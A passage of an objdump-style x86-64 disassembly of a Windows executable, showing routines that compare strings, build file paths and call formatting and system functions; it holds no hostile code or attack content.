   140003563:	48 85 c0             	test   %rax,%rax
   140003566:	0f 84 ca 01 00 00    	je     0x140003736
   14000356c:	48 8d 8f 10 10 00 00 	lea    0x1010(%rdi),%rcx
   140003573:	ba 00 10 00 00       	mov    $0x1000,%edx
   140003578:	4c 8d 4f 10          	lea    0x10(%rdi),%r9
   14000357c:	4c 8d 05 a9 84 02 00 	lea    0x284a9(%rip),%r8        # 0x14002ba2c
   140003583:	e8 68 e6 ff ff       	call   0x140001bf0
   140003588:	48 89 ac 24 a0 20 00 	mov    %rbp,0x20a0(%rsp)
   14000358f:	00 
   140003590:	4c 89 bc 24 a8 20 00 	mov    %r15,0x20a8(%rsp)
   140003597:	00 
   140003598:	4c 8b bf 10 20 00 00 	mov    0x2010(%rdi),%r15
   14000359f:	41 0f b6 87 18 10 00 	movzbl 0x1018(%r15),%eax
   1400035a6:	00 
   1400035a7:	88 87 20 20 00 00    	mov    %al,0x2020(%rdi)
   1400035ad:	88 87 21 20 00 00    	mov    %al,0x2021(%rdi)
   1400035b3:	49 8b 9f 08 10 00 00 	mov    0x1008(%r15),%rbx
   1400035ba:	49 3b 9f 10 10 00 00 	cmp    0x1010(%r15),%rbx
   1400035c1:	0f 83 8c 00 00 00    	jae    0x140003653
   1400035c7:	80 7b 11 6f          	cmpb   $0x6f,0x11(%rbx)
   1400035cb:	75 6b                	jne    0x140003638
   1400035cd:	41 b8 12 00 00 00    	mov    $0x12,%r8d
   1400035d3:	48 8d 15 9e 8a 02 00 	lea    0x28a9e(%rip),%rdx        # 0x14002c078
   1400035da:	48 8d 4b 12          	lea    0x12(%rbx),%rcx
   1400035de:	e8 7d 0f 01 00       	call   0x140014560
   1400035e3:	85 c0                	test   %eax,%eax
   1400035e5:	75 0b                	jne    0x1400035f2
   1400035e7:	48 8d 43 25          	lea    0x25(%rbx),%rax
   1400035eb:	48 89 87 40 30 00 00 	mov    %rax,0x3040(%rdi)
   1400035f2:	41 b8 16 00 00 00    	mov    $0x16,%r8d
   1400035f8:	48 8d 15 91 8a 02 00 	lea    0x28a91(%rip),%rdx        # 0x14002c090
   1400035ff:	48 8d 4b 12          	lea    0x12(%rbx),%rcx
   140003603:	e8 58 0f 01 00       	call   0x140014560
   140003608:	85 c0                	test   %eax,%eax
   14000360a:	75 0b                	jne    0x140003617
   14000360c:	48 8d 43 29          	lea    0x29(%rbx),%rax
   140003610:	48 89 87 48 30 00 00 	mov    %rax,0x3048(%rdi)
   140003617:	41 b8 1e 00 00 00    	mov    $0x1e,%r8d
   14000361d:	48 8d 15 84 8a 02 00 	lea    0x28a84(%rip),%rdx        # 0x14002c0a8
   140003624:	48 8d 4b 12          	lea    0x12(%rbx),%rcx
   140003628:	e8 33 0f 01 00       	call   0x140014560
   14000362d:	85 c0                	test   %eax,%eax
   14000362f:	75 07                	jne    0x140003638
   140003631:	c6 87 50 30 00 00 01 	movb   $0x1,0x3050(%rdi)
   140003638:	48 8b d3             	mov    %rbx,%rdx
   14000363b:	49 8b cf             	mov    %r15,%rcx
   14000363e:	e8 9d e2 ff ff       	call   0x1400018e0
   140003643:	48 8b d8             	mov    %rax,%rbx
   140003646:	49 3b 87 10 10 00 00 	cmp    0x1010(%r15),%rax
   14000364d:	0f 82 74 ff ff ff    	jb     0x1400035c7
   140003653:	48 8d 0d 86 88 02 00 	lea    0x28886(%rip),%rcx        # 0x14002bee0
   14000365a:	e8 b1 47 00 00       	call   0x140007e10
   14000365f:	4c 8b bc 24 a8 20 00 	mov    0x20a8(%rsp),%r15
   140003666:	00 
   140003667:	4c 8b c0             	mov    %rax,%r8
   14000366a:	48 85 c0             	test   %rax,%rax
   14000366d:	74 26                	je     0x140003695
   14000366f:	0f b6 10             	movzbl (%rax),%edx
   140003672:	83 ea 30             	sub    $0x30,%edx
   140003675:	75 0b                	jne    0x140003682
   140003677:	0f b6 50 01          	movzbl 0x1(%rax),%edx
   14000367b:	33 c0                	xor    %eax,%eax
   14000367d:	0f b6 c8             	movzbl %al,%ecx
   140003680:	2b d1                	sub    %ecx,%edx
   140003682:	85 d2                	test   %edx,%edx
   140003684:	49 8b c8             	mov    %r8,%rcx
   140003687:	0f 95 c0             	setne  %al
   14000368a:	88 87 31 30 00 00    	mov    %al,0x3031(%rdi)
   140003690:	e8 c7 0a 01 00       	call   0x14001415c
   140003695:	80 bf 20 20 00 00 00 	cmpb   $0x0,0x2020(%rdi)
   14000369c:	0f 84 a2 01 00 00    	je     0x140003844
   1400036a2:	48 8d 0d 57 88 02 00 	lea    0x28857(%rip),%rcx        # 0x14002bf00
   1400036a9:	e8 62 47 00 00       	call   0x140007e10
   1400036ae:	48 8d 0d 4b 88 02 00 	lea    0x2884b(%rip),%rcx        # 0x14002bf00
   1400036b5:	48 8b d8             	mov    %rax,%rbx
   1400036b8:	e8 c3 48 00 00       	call   0x140007f80
   1400036bd:	48 85 db             	test   %rbx,%rbx
   1400036c0:	0f 84 49 01 00 00    	je     0x14000380f
   1400036c6:	80 3b 00             	cmpb   $0x0,(%rbx)
   1400036c9:	0f 84 40 01 00 00    	je     0x14000380f
   1400036cf:	48 8d 8f 22 20 00 00 	lea    0x2022(%rdi),%rcx
   1400036d6:	c6 87 21 20 00 00 00 	movb   $0x0,0x2021(%rdi)
   1400036dd:	4c 8b cb             	mov    %rbx,%r9
   1400036e0:	4c 8d 05 45 83 02 00 	lea    0x28345(%rip),%r8        # 0x14002ba2c
   1400036e7:	ba 00 10 00 00       	mov    $0x1000,%edx
   1400036ec:	e8 ff e4 ff ff       	call   0x140001bf0
   1400036f1:	3d 00 10 00 00       	cmp    $0x1000,%eax
   1400036f6:	0f 8c 09 01 00 00    	jl     0x140003805
   1400036fc:	48 8d 0d 0d 88 02 00 	lea    0x2880d(%rip),%rcx        # 0x14002bf10
   140003703:	e8 e8 ee ff ff       	call   0x1400025f0
   140003708:	8b c6                	mov    %esi,%eax
   14000370a:	48 8b ac 24 a0 20 00 	mov    0x20a0(%rsp),%rbp
   140003711:	00 
   140003712:	48 8b 9c 24 98 20 00 	mov    0x2098(%rsp),%rbx
   140003719:	00 
   14000371a:	48 8b 8c 24 60 20 00 	mov    0x2060(%rsp),%rcx
   140003721:	00 
   140003722:	48 33 cc             	xor    %rsp,%rcx
   140003725:	e8 46 81 00 00       	call   0x14000b870
   14000372a:	48 81 c4 70 20 00 00 	add    $0x2070,%rsp
   140003731:	41 5e                	pop    %r14
   140003733:	5f                   	pop    %rdi
   140003734:	5e                   	pop    %rsi
   140003735:	c3                   	ret
   140003736:	48 8d 15 37 81 02 00 	lea    0x28137(%rip),%rdx        # 0x14002b874
   14000373d:	48 8d 4f 10          	lea    0x10(%rdi),%rcx
   140003741:	e8 2a 08 00 00       	call   0x140003f70
   140003746:	48 8b d8             	mov    %rax,%rbx
   140003749:	48 85 c0             	test   %rax,%rax
   14000374c:	74 37                	je     0x140003785
   14000374e:	48 8b 0d 03 9c 02 00 	mov    0x29c03(%rip),%rcx        # 0x14002d358
   140003755:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   14000375a:	48 89 4c 24 50       	mov    %rcx,0x50(%rsp)
   14000375f:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140003765:	48 c1 e9 18          	shr    $0x18,%rcx
   140003769:	80 c1 0d             	add    $0xd,%cl
   14000376c:	88 4c 24 53          	mov    %cl,0x53(%rsp)
   140003770:	48 8b c8             	mov    %rax,%rcx
   140003773:	e8 28 3f 00 00       	call   0x1400076a0
   140003778:	48 85 c0             	test   %rax,%rax
   14000377b:	75 22                	jne    0x14000379f
   14000377d:	48 8b cb             	mov    %rbx,%rcx
   140003780:	e8 e7 bb 00 00       	call   0x14000f36c
   140003785:	48 8d 5f 10          	lea    0x10(%rdi),%rbx
   140003789:	48 8b d3             	mov    %rbx,%rdx
   14000378c:	48 8d 0d ed 8a 02 00 	lea    0x28aed(%rip),%rcx        # 0x14002c280
   140003793:	e8 58 ee ff ff       	call   0x1400025f0
   140003798:	8b c6                	mov    %esi,%eax
   14000379a:	e9 73 ff ff ff       	jmp    0x140003712
   14000379f:	48 8d 9f 10 10 00 00 	lea    0x1010(%rdi),%rbx
   1400037a6:	ba 00 10 00 00       	mov    $0x1000,%edx
   1400037ab:	48 8b cb             	mov    %rbx,%rcx
   1400037ae:	4c 8d 4f 10          	lea    0x10(%rdi),%r9
   1400037b2:	4c 8d 05 73 82 02 00 	lea    0x28273(%rip),%r8        # 0x14002ba2c
   1400037b9:	e8 32 e4 ff ff       	call   0x140001bf0
   1400037be:	48 8b c6             	mov    %rsi,%rax
   1400037c1:	80 7c 03 01 00       	cmpb   $0x0,0x1(%rbx,%rax,1)
   1400037c6:	48 8d 40 01          	lea    0x1(%rax),%rax
   1400037ca:	75 f5                	jne    0x1400037c1
   1400037cc:	48 8b cb             	mov    %rbx,%rcx
   1400037cf:	c7 84 38 0d 10 00 00 	movl   $0x676b70,0x100d(%rax,%rdi,1)
   1400037d6:	70 6b 67 00 
   1400037da:	e8 11 e1 ff ff       	call   0x1400018f0
   1400037df:	48 89 87 10 20 00 00 	mov    %rax,0x2010(%rdi)
   1400037e6:	48 85 c0             	test   %rax,%rax
   1400037e9:	0f 85 99 fd ff ff    	jne    0x140003588
   1400037ef:	48 8d 0d da 8a 02 00 	lea    0x28ada(%rip),%rcx        # 0x14002c2d0
   1400037f6:	48 8b d3             	mov    %rbx,%rdx
   1400037f9:	e8 f2 ed ff ff       	call   0x1400025f0
   1400037fe:	8b c6                	mov    %esi,%eax
   140003800:	e9 0d ff ff ff       	jmp    0x140003712
   140003805:	48 8b cb             	mov    %rbx,%rcx
   140003808:	e8 4f 09 01 00       	call   0x14001415c
   14000380d:	eb 78                	jmp    0x140003887
   14000380f:	e8 ec 4b 00 00       	call   0x140008400
   140003814:	48 89 87 38 30 00 00 	mov    %rax,0x3038(%rdi)
   14000381b:	48 85 c0             	test   %rax,%rax
   14000381e:	75 0c                	jne    0x14000382c
   140003820:	48 8d 0d 19 87 02 00 	lea    0x28719(%rip),%rcx        # 0x14002bf40
   140003827:	e9 d7 fe ff ff       	jmp    0x140003703
   14000382c:	48 8b cf             	mov    %rdi,%rcx
   14000382f:	e8 0c 44 00 00       	call   0x140007c40
   140003834:	85 c0                	test   %eax,%eax
   140003836:	79 4f                	jns    0x140003887
   140003838:	48 8d 0d 49 87 02 00 	lea    0x28749(%rip),%rcx        # 0x14002bf88
   14000383f:	e9 bf fe ff ff       	jmp    0x140003703
   140003844:	48 8d 57 10          	lea    0x10(%rdi),%rdx
   140003848:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   14000384d:	e8 3e 06 00 00       	call   0x140003e90
   140003852:	4c 8b 87 48 30 00 00 	mov    0x3048(%rdi),%r8
   140003859:	48 8d 8f 22 20 00 00 	lea    0x2022(%rdi),%rcx
   140003860:	4d 85 c0             	test   %r8,%r8
   140003863:	74 0c                	je     0x140003871
   140003865:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   14000386a:	e8 71 07 00 00       	call   0x140003fe0
   14000386f:	eb 16                	jmp    0x140003887
   140003871:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   140003876:	ba 00 10 00 00       	mov    $0x1000,%edx
   14000387b:	4c 8d 05 aa 81 02 00 	lea    0x281aa(%rip),%r8        # 0x14002ba2c
   140003882:	e8 69 e3 ff ff       	call   0x140001bf0
   140003887:	48 8d 8f 22 20 00 00 	lea    0x2022(%rdi),%rcx
   14000388e:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140003894:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140003899:	e8 12 4e 00 00       	call   0x1400086b0
   14000389e:	48 85 c0             	test   %rax,%rax
   1400038a1:	75 0c                	jne    0x1400038af
   1400038a3:	48 8d 0d 06 87 02 00 	lea    0x28706(%rip),%rcx        # 0x14002bfb0
   1400038aa:	e9 54 fe ff ff       	jmp    0x140003703
   1400038af:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400038b4:	ff 15 0e 78 02 00    	call   *0x2780e(%rip)        # 0x14002b0c8
   1400038ba:	80 bf 20 20 00 00 00 	cmpb   $0x0,0x2020(%rdi)
   1400038c1:	74 0d                	je     0x1400038d0
   1400038c3:	80 bf 21 20 00 00 00 	cmpb   $0x0,0x2021(%rdi)
   1400038ca:	0f 84 80 01 00 00    	je     0x140003a50
   1400038d0:	e8 8b 2c 00 00       	call   0x140006560
   1400038d5:	48 8d 9f 18 20 00 00 	lea    0x2018(%rdi),%rbx
   1400038dc:	48 8b d7             	mov    %rdi,%rdx
   1400038df:	48 8b c8             	mov    %rax,%rcx
   1400038e2:	48 89 03             	mov    %rax,(%rbx)
   1400038e5:	e8 16 32 00 00       	call   0x140006b00
   1400038ea:	85 c0                	test   %eax,%eax
   1400038ec:	75 59                	jne    0x140003947
   1400038ee:	38 87 20 20 00 00    	cmp    %al,0x2020(%rdi)
   1400038f4:	74 18                	je     0x14000390e
   1400038f6:	48 8b 0b             	mov    (%rbx),%rcx
   1400038f9:	48 8b d7             	mov    %rdi,%rdx
   1400038fc:	e8 9f 2c 00 00       	call   0x1400065a0
   140003901:	85 c0                	test   %eax,%eax
   140003903:	74 09                	je     0x14000390e
   140003905:	48 8d 0d cc 86 02 00 	lea    0x286cc(%rip),%rcx        # 0x14002bfd8
   14000390c:	eb 2c                	jmp    0x14000393a
   14000390e:	48 8b 0b             	mov    (%rbx),%rcx
   140003911:	e8 5a 30 00 00       	call   0x140006970
   140003916:	85 c0                	test   %eax,%eax
   140003918:	74 09                	je     0x140003923
   14000391a:	48 8d 0d f7 86 02 00 	lea    0x286f7(%rip),%rcx        # 0x14002c018
   140003921:	eb 17                	jmp    0x14000393a
   140003923:	48 8b 0b             	mov    (%rbx),%rcx
   140003926:	48 8d 57 10          	lea    0x10(%rdi),%rdx
   14000392a:	e8 a1 33 00 00       	call   0x140006cd0
   14000392f:	85 c0                	test   %eax,%eax
   140003931:	74 1c                	je     0x14000394f
   140003933:	48 8d 0d 1e 87 02 00 	lea    0x2871e(%rip),%rcx        # 0x14002c058
   14000393a:	e8 31 ef ff ff       	call   0x140002870
   14000393f:	48 8b 0b             	mov    (%rbx),%rcx
   140003942:	e8 39 2e 00 00       	call   0x140006780
   140003947:	48 8b cb             	mov    %rbx,%rcx
   14000394a:	e8 c1 2b 00 00       	call   0x140006510
   14000394f:	80 bf 21 20 00 00 00 	cmpb   $0x0,0x2021(%rdi)
   140003956:	0f 84 f4 00 00 00    	je     0x140003a50
   14000395c:	48 8b cf             	mov    %rdi,%rcx
   14000395f:	e8 7c f7 ff ff       	call   0x1400030e0
   140003964:	85 c0                	test   %eax,%eax
   140003966:	0f 88 9c fd ff ff    	js     0x140003708
   14000396c:	48 8d 8f 38 30 00 00 	lea    0x3038(%rdi),%rcx
   140003973:	e8 68 4a 00 00       	call   0x1400083e0
   140003978:	48 83 bf 18 20 00 00 	cmpq   $0x0,0x2018(%rdi)
   14000397f:	00 
   140003980:	75 23                	jne    0x1400039a5
   140003982:	45 33 c9             	xor    %r9d,%r9d
   140003985:	45 33 c0             	xor    %r8d,%r8d
   140003988:	33 d2                	xor    %edx,%edx
   14000398a:	33 c9                	xor    %ecx,%ecx
   14000398c:	ff 15 26 7a 02 00    	call   *0x27a26(%rip)        # 0x14002b3b8
   140003992:	45 33 c9             	xor    %r9d,%r9d
   140003995:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000399a:	45 33 c0             	xor    %r8d,%r8d
   14000399d:	33 d2                	xor    %edx,%edx
   14000399f:	ff 15 1b 7a 02 00    	call   *0x27a1b(%rip)        # 0x14002b3c0
   1400039a5:	48 8d 97 22 20 00 00 	lea    0x2022(%rdi),%rdx
   1400039ac:	48 8d 0d 4d 85 02 00 	lea    0x2854d(%rip),%rcx        # 0x14002bf00
   1400039b3:	e8 68 45 00 00       	call   0x140007f20
   1400039b8:	48 8b cf             	mov    %rdi,%rcx
   1400039bb:	e8 00 46 00 00       	call   0x140007fc0
   1400039c0:	48 8b 8f 18 20 00 00 	mov    0x2018(%rdi),%rcx
   1400039c7:	8b e8                	mov    %eax,%ebp
   1400039c9:	e8 b2 2d 00 00       	call   0x140006780
   1400039ce:	48 8d 8f 18 20 00 00 	lea    0x2018(%rdi),%rcx
   1400039d5:	e8 36 2b 00 00       	call   0x140006510
   1400039da:	48 8d 8f 22 20 00 00 	lea    0x2022(%rdi),%rcx
   1400039e1:	e8 da 44 00 00       	call   0x140007ec0
   1400039e6:	85 c0                	test   %eax,%eax
   1400039e8:	79 53                	jns    0x140003a3d
   1400039ea:	48 8b cf             	mov    %rdi,%rcx
   1400039ed:	e8 fe 47 00 00       	call   0x1400081f0
   1400039f2:	48 8d 8f 22 20 00 00 	lea    0x2022(%rdi),%rcx
   1400039f9:	e8 c2 44 00 00       	call   0x140007ec0
   1400039fe:	85 c0                	test   %eax,%eax
   140003a00:	79 3b                	jns    0x140003a3d
   140003a02:	80 bf 31 30 00 00 00 	cmpb   $0x0,0x3031(%rdi)
   140003a09:	48 8d 97 22 20 00 00 	lea    0x2022(%rdi),%rdx
   140003a10:	74 1f                	je     0x140003a31
   140003a12:	48 8d 0d af 86 02 00 	lea    0x286af(%rip),%rcx        # 0x14002c0c8
   140003a19:	e8 d2 eb ff ff       	call   0x1400025f0
   140003a1e:	48 8d 8f 10 20 00 00 	lea    0x2010(%rdi),%rcx
   140003a25:	8b ee                	mov    %esi,%ebp
   140003a27:	e8 74 de ff ff       	call   0x1400018a0
   140003a2c:	e9 d7 fc ff ff       	jmp    0x140003708
   140003a31:	48 8d 0d c8 86 02 00 	lea    0x286c8(%rip),%rcx        # 0x14002c100
   140003a38:	e8 33 ee ff ff       	call   0x140002870
   140003a3d:	48 8d 8f 10 20 00 00 	lea    0x2010(%rdi),%rcx
   140003a44:	e8 57 de ff ff       	call   0x1400018a0
   140003a49:	8b f5                	mov    %ebp,%esi
   140003a4b:	e9 b8 fc ff ff       	jmp    0x140003708
   140003a50:	48 83 bf 18 20 00 00 	cmpq   $0x0,0x2018(%rdi)
   140003a57:	00 
   140003a58:	75 23                	jne    0x140003a7d
   140003a5a:	45 33 c9             	xor    %r9d,%r9d
   140003a5d:	45 33 c0             	xor    %r8d,%r8d
   140003a60:	33 d2                	xor    %edx,%edx
   140003a62:	33 c9                	xor    %ecx,%ecx
   140003a64:	ff 15 4e 79 02 00    	call   *0x2794e(%rip)        # 0x14002b3b8
   140003a6a:	45 33 c9             	xor    %r9d,%r9d
   140003a6d:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003a72:	45 33 c0             	xor    %r8d,%r8d
   140003a75:	33 d2                	xor    %edx,%edx
   140003a77:	ff 15 43 79 02 00    	call   *0x27943(%rip)        # 0x14002b3c0
   140003a7d:	48 8b cf             	mov    %rdi,%rcx
   140003a80:	e8 4b f9 ff ff       	call   0x1400033d0
   140003a85:	48 8b cf             	mov    %rdi,%rcx
   140003a88:	e8 f3 f5 ff ff       	call   0x140003080
   140003a8d:	48 8b cf             	mov    %rdi,%rcx
   140003a90:	8b d8                	mov    %eax,%ebx
   140003a92:	e8 09 f9 ff ff       	call   0x1400033a0
   140003a97:	48 8b 8f 18 20 00 00 	mov    0x2018(%rdi),%rcx
   140003a9e:	e8 dd 2c 00 00       	call   0x140006780
   140003aa3:	48 8d 8f 18 20 00 00 	lea    0x2018(%rdi),%rcx
   140003aaa:	e8 61 2a 00 00       	call   0x140006510
   140003aaf:	8b c3                	mov    %ebx,%eax
   140003ab1:	e9 54 fc ff ff       	jmp    0x14000370a
   140003ab6:	cc                   	int3
   140003ab7:	cc                   	int3
   140003ab8:	cc                   	int3
   140003ab9:	cc                   	int3
   140003aba:	cc                   	int3
   140003abb:	cc                   	int3
   140003abc:	cc                   	int3
   140003abd:	cc                   	int3
   140003abe:	cc                   	int3
   140003abf:	cc                   	int3
   140003ac0:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140003ac5:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140003aca:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140003acf:	53                   	push   %rbx
   140003ad0:	56                   	push   %rsi
   140003ad1:	57                   	push   %rdi
   140003ad2:	48 83 ec 30          	sub    $0x30,%rsp
   140003ad6:	48 8b da             	mov    %rdx,%rbx
   140003ad9:	48 8d 74 24 60       	lea    0x60(%rsp),%rsi
   140003ade:	48 8b f9             	mov    %rcx,%rdi
   140003ae1:	e8 5a d5 ff ff       	call   0x140001040
   140003ae6:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   140003aeb:	4c 8b cb             	mov    %rbx,%r9
   140003aee:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140003af4:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003afb:	00 00 
   140003afd:	48 8b d7             	mov    %rdi,%rdx
   140003b00:	48 8b 08             	mov    (%rax),%rcx
   140003b03:	48 83 c9 02          	or     $0x2,%rcx
   140003b07:	e8 98 01 01 00       	call   0x140013ca4
   140003b0c:	85 c0                	test   %eax,%eax
   140003b0e:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140003b13:	0f 48 c1             	cmovs  %ecx,%eax
   140003b16:	3d 00 10 00 00       	cmp    $0x1000,%eax
   140003b1b:	7c 0a                	jl     0x140003b27
   140003b1d:	8b c1                	mov    %ecx,%eax
   140003b1f:	48 83 c4 30          	add    $0x30,%rsp
   140003b23:	5f                   	pop    %rdi
   140003b24:	5e                   	pop    %rsi
   140003b25:	5b                   	pop    %rbx
   140003b26:	c3                   	ret
   140003b27:	48 8b cf             	mov    %rdi,%rcx
   140003b2a:	e8 e1 03 00 00       	call   0x140003f10
   140003b2f:	48 83 c4 30          	add    $0x30,%rsp
   140003b33:	5f                   	pop    %rdi
   140003b34:	5e                   	pop    %rsi
   140003b35:	5b                   	pop    %rbx
   140003b36:	c3                   	ret
   140003b37:	cc                   	int3
   140003b38:	cc                   	int3
   140003b39:	cc                   	int3
   140003b3a:	cc                   	int3
   140003b3b:	cc                   	int3
   140003b3c:	cc                   	int3
   140003b3d:	cc                   	int3
   140003b3e:	cc                   	int3
   140003b3f:	cc                   	int3
   140003b40:	40 53                	rex push %rbx
   140003b42:	55                   	push   %rbp
   140003b43:	56                   	push   %rsi
   140003b44:	57                   	push   %rdi
   140003b45:	41 56                	push   %r14
   140003b47:	b8 60 40 00 00       	mov    $0x4060,%eax
   140003b4c:	e8 1f 80 00 00       	call   0x14000bb70
   140003b51:	48 2b e0             	sub    %rax,%rsp
   140003b54:	48 8b 05 e5 a4 03 00 	mov    0x3a4e5(%rip),%rax        # 0x14003e040
   140003b5b:	48 33 c4             	xor    %rsp,%rax
   140003b5e:	48 89 84 24 50 40 00 	mov    %rax,0x4050(%rsp)
   140003b65:	00 
   140003b66:	4c 8b b4 24 b0 40 00 	mov    0x40b0(%rsp),%r14
   140003b6d:	00 
   140003b6e:	48 8b f2             	mov    %rdx,%rsi
   140003b71:	48 8d 51 10          	lea    0x10(%rcx),%rdx
   140003b75:	48 8b d9             	mov    %rcx,%rbx
   140003b78:	48 8d 8c 24 50 10 00 	lea    0x1050(%rsp),%rcx
   140003b7f:	00 
   140003b80:	49 8b e9             	mov    %r9,%rbp
   140003b83:	49 8b f8             	mov    %r8,%rdi
   140003b86:	e8 05 03 00 00       	call   0x140003e90
   140003b8b:	48 8b d7             	mov    %rdi,%rdx
   140003b8e:	48 8d 8c 24 50 30 00 	lea    0x3050(%rsp),%rcx
   140003b95:	00 
   140003b96:	e8 f5 02 00 00       	call   0x140003e90
   140003b9b:	48 8b 83 48 30 00 00 	mov    0x3048(%rbx),%rax
   140003ba2:	4c 8d 84 24 50 10 00 	lea    0x1050(%rsp),%r8
   140003ba9:	00 
   140003baa:	48 8d 8c 24 50 20 00 	lea    0x2050(%rsp),%rcx
   140003bb1:	00 
   140003bb2:	41 b9 5c 00 00 00    	mov    $0x5c,%r9d
   140003bb8:	48 85 c0             	test   %rax,%rax
   140003bbb:	74 2f                	je     0x140003bec
   140003bbd:	48 89 6c 24 40       	mov    %rbp,0x40(%rsp)
   140003bc2:	48 8d 15 97 87 02 00 	lea    0x28797(%rip),%rdx        # 0x14002c360
   140003bc9:	44 89 4c 24 38       	mov    %r9d,0x38(%rsp)
   140003bce:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140003bd3:	48 8d 84 24 50 30 00 	lea    0x3050(%rsp),%rax
   140003bda:	00 
   140003bdb:	44 89 4c 24 28       	mov    %r9d,0x28(%rsp)
   140003be0:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003be5:	e8 d6 fe ff ff       	call   0x140003ac0
   140003bea:	eb 26                	jmp    0x140003c12
   140003bec:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   140003bf1:	48 8d 84 24 50 30 00 	lea    0x3050(%rsp),%rax
   140003bf8:	00 
   140003bf9:	c7 44 24 28 5c 00 00 	movl   $0x5c,0x28(%rsp)
   140003c00:	00 
   140003c01:	48 8d 15 68 87 02 00 	lea    0x28768(%rip),%rdx        # 0x14002c370
   140003c08:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003c0d:	e8 ae fe ff ff       	call   0x140003ac0
   140003c12:	83 f8 01             	cmp    $0x1,%eax
   140003c15:	75 35                	jne    0x140003c4c
   140003c17:	49 8b d6             	mov    %r14,%rdx
   140003c1a:	48 8d 8c 24 50 20 00 	lea    0x2050(%rsp),%rcx
   140003c21:	00 
   140003c22:	e8 d9 37 00 00       	call   0x140007400
   140003c27:	83 f8 ff             	cmp    $0xffffffff,%eax
   140003c2a:	0f 85 7a 01 00 00    	jne    0x140003daa
   140003c30:	4c 8d 84 24 50 20 00 	lea    0x2050(%rsp),%r8
   140003c37:	00 
   140003c38:	48 8b d5             	mov    %rbp,%rdx
   140003c3b:	48 8d 0d 3e 87 02 00 	lea    0x2873e(%rip),%rcx        # 0x14002c380
   140003c42:	e8 a9 e9 ff ff       	call   0x1400025f0
   140003c47:	e9 84 01 00 00       	jmp    0x140003dd0
   140003c4c:	41 b9 5c 00 00 00    	mov    $0x5c,%r9d
   140003c52:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140003c57:	4c 8d 84 24 50 10 00 	lea    0x1050(%rsp),%r8
   140003c5e:	00 
   140003c5f:	48 8d 15 42 87 02 00 	lea    0x28742(%rip),%rdx        # 0x14002c3a8
   140003c66:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140003c6b:	e8 50 fe ff ff       	call   0x140003ac0
   140003c70:	83 f8 01             	cmp    $0x1,%eax
   140003c73:	74 61                	je     0x140003cd6
   140003c75:	41 b9 5c 00 00 00    	mov    $0x5c,%r9d
   140003c7b:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140003c80:	4c 8d 84 24 50 10 00 	lea    0x1050(%rsp),%r8
   140003c87:	00 
   140003c88:	48 8d 15 29 87 02 00 	lea    0x28729(%rip),%rdx        # 0x14002c3b8
   140003c8f:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140003c94:	e8 27 fe ff ff       	call   0x140003ac0
   140003c99:	83 f8 01             	cmp    $0x1,%eax
   140003c9c:	74 38                	je     0x140003cd6
   140003c9e:	41 b9 5c 00 00 00    	mov    $0x5c,%r9d
   140003ca4:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140003ca9:	4c 8d 84 24 50 10 00 	lea    0x1050(%rsp),%r8
   140003cb0:	00 
   140003cb1:	48 8d 15 d0 7f 02 00 	lea    0x27fd0(%rip),%rdx        # 0x14002bc88
   140003cb8:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140003cbd:	e8 fe fd ff ff       	call   0x140003ac0
   140003cc2:	83 f8 01             	cmp    $0x1,%eax
   140003cc5:	74 0f                	je     0x140003cd6
   140003cc7:	48 8b d7             	mov    %rdi,%rdx
   140003cca:	48 8d 0d f7 86 02 00 	lea    0x286f7(%rip),%rcx        # 0x14002c3c8
   140003cd1:	e9 f5 00 00 00       	jmp    0x140003dcb
   140003cd6:	48 8b 1e             	mov    (%rsi),%rbx
   140003cd9:	33 ff                	xor    %edi,%edi
   140003cdb:	48 85 db             	test   %rbx,%rbx
   140003cde:	74 63                	je     0x140003d43
   140003ce0:	44 8b cf             	mov    %edi,%r9d
   140003ce3:	0f 1f 40 00          	nopl   0x0(%rax)
   140003ce7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140003cee:	00 00 
   140003cf0:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   140003cf5:	48 8b c3             	mov    %rbx,%rax
   140003cf8:	4c 2b c3             	sub    %rbx,%r8
   140003cfb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003d00:	0f b6 10             	movzbl (%rax),%edx
   140003d03:	42 0f b6 0c 00       	movzbl (%rax,%r8,1),%ecx
   140003d08:	2b d1                	sub    %ecx,%edx
   140003d0a:	75 07                	jne    0x140003d13
   140003d0c:	48 ff c0             	inc    %rax
   140003d0f:	85 c9                	test   %ecx,%ecx
   140003d11:	75 ed                	jne    0x140003d00
   140003d13:	85 d2                	test   %edx,%edx
   140003d15:	74 25                	je     0x140003d3c
   140003d17:	4a 8b 5c ce 08       	mov    0x8(%rsi,%r9,8),%rbx
   140003d1c:	49 ff c1             	inc    %r9
   140003d1f:	ff c7                	inc    %edi
   140003d21:	48 85 db             	test   %rbx,%rbx
   140003d24:	75 ca                	jne    0x140003cf0
   140003d26:	83 ff 14             	cmp    $0x14,%edi
   140003d29:	7c 18                	jl     0x140003d43
   140003d2b:	48 8d 0d e6 85 02 00 	lea    0x285e6(%rip),%rcx        # 0x14002c318
